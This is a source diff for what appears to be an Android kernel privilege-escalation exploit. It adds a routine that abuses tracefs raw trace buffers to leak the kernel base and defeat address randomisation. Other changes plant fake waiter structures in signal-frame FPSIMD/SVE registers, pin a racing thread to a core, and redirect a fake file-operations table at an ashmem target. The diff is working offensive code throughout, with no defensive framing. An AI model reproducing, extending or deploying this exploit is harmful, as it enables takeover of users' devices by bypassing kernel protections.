@@ -63,6 +63,181 @@ int p0_virtual_base_probe;
 
 static int slide_commit_stext(uint64_t stext, const char *source);
 
+#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
+#define SLIDE_TRACEFS_ROOT "/sys/kernel/tracing"
+
+static int slide_tracefs_write(const char *path, const char *value) {
+  int fd = open(path, O_WRONLY | O_CLOEXEC);
+  if (fd < 0) {
+    return 0;
+  }
+  size_t len = strlen(value);
+  ssize_t wrote = write(fd, value, len);
+  close(fd);
+  return wrote == (ssize_t)len;
+}
+
+static int slide_tracefs_parse_page(
+    const unsigned char *page, size_t page_len, uintptr_t *candidate_out) {
+  if (page_len < 20) {
+    return 0;
+  }
+  uint64_t commit = 0;
+  memcpy(&commit, page + 8, sizeof(commit));
+  size_t data_len = (size_t)(commit & 0xfffULL);
+  size_t end = 16 + data_len;
+  if (end > page_len) {
+    end = page_len;
+  }
+  for (size_t pos = 16; pos + 4 <= end;) {
+    uint32_t event_header = 0;
+    memcpy(&event_header, page + pos, sizeof(event_header));
+    uint32_t type_len = event_header & 0x1fU;
+    if (type_len == 30) {
+      pos += 8;
+      continue;
+    }
+    if (type_len == 31) {
+      pos += 12;
+      continue;
+    }
+    if (type_len == 0 || type_len >= 29) {
+      break;
+    }
+    size_t record_len = (size_t)type_len * 4;
+    size_t record = pos + 4;
+    if (record + record_len > end) {
+      break;
+    }
+    uint16_t event_id = 0;
+    memcpy(&event_id, page + record, sizeof(event_id));
+    if (event_id == SLIDE_TRACEFS_EVENT_ID && record_len >= 24) {
+      uint64_t caller = 0;
+      memcpy(&caller, page + record + 16, sizeof(caller));
+      uint64_t link_caller =
+          KIMAGE_TEXT_BASE + SLIDE_TRACEFS_WORKER_CALLER_OFF;
+      if (caller >= link_caller) {
+        uint64_t candidate = caller - link_caller;
+        if (candidate <= 0x1f0000ULL && (candidate & 0xffffULL) == 0) {
+          pr_success("slide tracefs caller=%016llx candidate=%08llx\n",
+                     (unsigned long long)caller,
+                     (unsigned long long)candidate);
+          *candidate_out = (uintptr_t)candidate;
+          return 1;
+        }
+      }
+    }
+    pos = record + record_len;
+  }
+  return 0;
+}
+
+static int slide_tracefs_trigger(void) {
+  char path[96];
+  snprintf(path, sizeof(path), "/data/local/tmp/.s23-trace-io-%d", getpid());
+  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
+  if (fd < 0) {
+    pr_error("slide tracefs trigger open failed errno=%d\n", errno);
+    return 0;
+  }
+  size_t chunk_size = 0x40000;
+  unsigned char *chunk = calloc(1, chunk_size);
+  if (!chunk) {
+    int saved_errno = errno;
+    close(fd);
+    unlink(path);
+    errno = saved_errno;
+    pr_error("slide tracefs trigger alloc failed errno=%d\n", errno);
+    return 0;
+  }
+  int ok = 1;
+  for (int round = 0; round < 16 && ok; round++) {
+    size_t done = 0;
+    while (done < chunk_size) {
+      ssize_t wrote = write(fd, chunk + done, chunk_size - done);
+      if (wrote < 0 && errno == EINTR) {
+        continue;
+      }
+      if (wrote <= 0) {
+        ok = 0;
+        break;
+      }
+      done += (size_t)wrote;
+    }
+  }
+  free(chunk);
+  if (ok && fsync(fd) != 0) {
+    ok = 0;
+  }
+  int saved_errno = errno;
+  close(fd);
+  unlink(path);
+  errno = saved_errno;
+  if (!ok) {
+    pr_error("slide tracefs trigger write failed errno=%d\n", errno);
+    return 0;
+  }
+  pr_info("slide tracefs trigger bytes=%u\n", 16U * 0x40000U);
+  return 1;
+}
+
+static int slide_tracefs_leak_kernel_base(void) {
+  static const char tracing_on[] =
+      SLIDE_TRACEFS_ROOT "/tracing_on";
+  static const char trace[] =
+      SLIDE_TRACEFS_ROOT "/trace";
+  static const char event_enable[] =
+      SLIDE_TRACEFS_ROOT "/events/sched/sched_blocked_reason/enable";
+  if (!slide_tracefs_write(tracing_on, "0")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+  int trace_fd = open(trace, O_WRONLY | O_TRUNC | O_CLOEXEC);
+  if (trace_fd >= 0) {
+    close(trace_fd);
+  }
+  if (!slide_tracefs_write(event_enable, "1") ||
+      !slide_tracefs_write(tracing_on, "1")) {
+    pr_error("slide tracefs setup failed errno=%d\n", errno);
+    return 0;
+  }
+  if (!slide_tracefs_trigger()) {
+    slide_tracefs_write(tracing_on, "0");
+    slide_tracefs_write(event_enable, "0");
+    return 0;
+  }
+  sleep(1);
+  slide_tracefs_write(tracing_on, "0");
+  int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
+  uintptr_t candidate = 0;
+  int found = 0;
+  for (int cpu = 0; cpu < cpu_count && !found; cpu++) {
+    char path[128];
+    snprintf(path, sizeof(path),
+             SLIDE_TRACEFS_ROOT "/per_cpu/cpu%d/trace_pipe_raw", cpu);
+    int fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
+    if (fd < 0) {
+      continue;
+    }
+    unsigned char page[4096];
+    ssize_t got;
+    while ((got = read(fd, page, sizeof(page))) > 0) {
+      if (slide_tracefs_parse_page(page, (size_t)got, &candidate)) {
+        found = 1;
+        break;
+      }
+    }
+    close(fd);
+  }
+  slide_tracefs_write(event_enable, "0");
+  if (!found) {
+    pr_error("slide tracefs worker caller not found\n");
+    return 0;
+  }
+  return slide_commit_stext(KIMAGE_TEXT_BASE + candidate, "tracefs");
+}
+#endif
+
 #if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
 static int slide_commit_virtual_base(uint64_t base, const char *source) {
   if ((base >> 48) != 0xffff || (base & 0x1fffffULL) != 0 ||
@@ -539,7 +714,8 @@ static atomic_int slide_sigreturn_status;
 static atomic_int slide_sigreturn_found_fpsimd;
 static atomic_int slide_sigreturn_found_sve;
 static atomic_int slide_sigreturn_waiter_off;
-static unsigned char slide_sigreturn_waiter[FAKE_WAITER_LAYOUT_SIZE];
+static unsigned char slide_sigreturn_payload_fpsimd[0x200];
+static unsigned char slide_sigreturn_payload_sve[0x200];
 
 _Static_assert(ATOMIC_INT_LOCK_FREE == 2,
                "signal handler atomics must be lock-free");
@@ -597,7 +773,7 @@ static void slide_sigreturn_handler(int signal_number,
 
   size_t waiter_off = saw_sve ? SIGRETURN_SVE_WAITER_OFF
                               : SIGRETURN_FPSIMD_WAITER_OFF;
-  if (waiter_off + sizeof(slide_sigreturn_waiter) >
+  if (waiter_off + FAKE_WAITER_LAYOUT_SIZE >
       sizeof(fpsimd->vregs)) {
     status = -5;
     goto done;
@@ -611,9 +787,12 @@ static void slide_sigreturn_handler(int signal_number,
                         memory_order_relaxed);
 
   volatile unsigned char *destination =
-      (volatile unsigned char *)fpsimd->vregs + waiter_off;
-  for (size_t index = 0; index < sizeof(slide_sigreturn_waiter); index++) {
-    destination[index] = slide_sigreturn_waiter[index];
+      (volatile unsigned char *)fpsimd->vregs;
+  const unsigned char *source = saw_sve ? slide_sigreturn_payload_sve
+                                        : slide_sigreturn_payload_fpsimd;
+  for (size_t index = 0;
+       index < sizeof(slide_sigreturn_payload_fpsimd); index++) {
+    destination[index] = source[index];
   }
   status = 1;
 
@@ -624,7 +803,14 @@ done:
 }
 
 static void slide_sigreturn_stack_copy(void) {
-  slide_build_fake_waiter(slide_sigreturn_waiter, 0);
+  memset(slide_sigreturn_payload_fpsimd, 0,
+         sizeof(slide_sigreturn_payload_fpsimd));
+  memset(slide_sigreturn_payload_sve, 0,
+         sizeof(slide_sigreturn_payload_sve));
+  slide_build_fake_waiter(slide_sigreturn_payload_fpsimd,
+                          SIGRETURN_FPSIMD_WAITER_OFF);
+  slide_build_fake_waiter(slide_sigreturn_payload_sve,
+                          SIGRETURN_SVE_WAITER_OFF);
 
   struct sigaction action;
   struct sigaction old_action;
@@ -652,7 +838,14 @@ static void slide_sigreturn_stack_copy(void) {
 
   int tid = (int)syscall(SYS_gettid);
   errno = 0;
-  int ret = (int)syscall(SYS_tgkill, getpid(), tid, SIGUSR2);
+  siginfo_t signal_info;
+  memset(&signal_info, 0, sizeof(signal_info));
+  signal_info.si_signo = SIGUSR2;
+  signal_info.si_code = SI_QUEUE;
+  signal_info.si_pid = getpid();
+  signal_info.si_uid = getuid();
+  int ret = (int)syscall(SYS_rt_tgsigqueueinfo, getpid(), tid,
+                         SIGUSR2, &signal_info);
   int saved_errno = errno;
   int handler_done = atomic_load_explicit(&slide_sigreturn_done,
                                           memory_order_acquire);
@@ -902,6 +1095,9 @@ void *slide_consumer_thread(void *arg __attribute__((unused))) {
 }
 
 void *slide_waiter_thread(void *arg __attribute__((unused))) {
+#ifdef SLIDE_WAITER_CORE
+  pin_to_core(SLIDE_WAITER_CORE);
+#endif
   int tid = (int)SYSCHK(syscall(SYS_gettid));
   atomic_store(&slide_waiter_tid, tid);
 
@@ -1293,9 +1489,14 @@ int app_trigger_fops_slide_route(void) {
     70000, 60000, 80000, 40000, 90000, 50000,
     30000, 20000, 75000, 65000, 85000, 55000,
   };
+#if defined(APP_CLOSED_FOPS_ROUTE) && APP_CLOSED_FOPS_ROUTE
+  slide_oracle_parent = fake_fops;
+  slide_oracle_target = data_addr(ASHMEM_MISC_FOPS);
+#else
   if (!select_slide_payload_index(0)) {
     return 0;
   }
+#endif
   int delay = 0;
 #if defined(APP_FOPS_ROUTE_USE_PSELECT_DELAY) && APP_FOPS_ROUTE_USE_PSELECT_DELAY
   const char *forced = getenv("PSELECT_DELAY_USEC");
@@ -1779,7 +1980,11 @@ int slide_leak_kernel_base(void) {
     return slide_commit_stext(KIMAGE_TEXT_BASE + value, "forced");
 #endif
   }
+#if defined(APP_TRACEFS_SLIDE) && APP_TRACEFS_SLIDE
+  return slide_tracefs_leak_kernel_base();
+#else
   return slide_leak_physical_base();
+#endif
 #else
   const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
   uintptr_t forced_offset = 0;
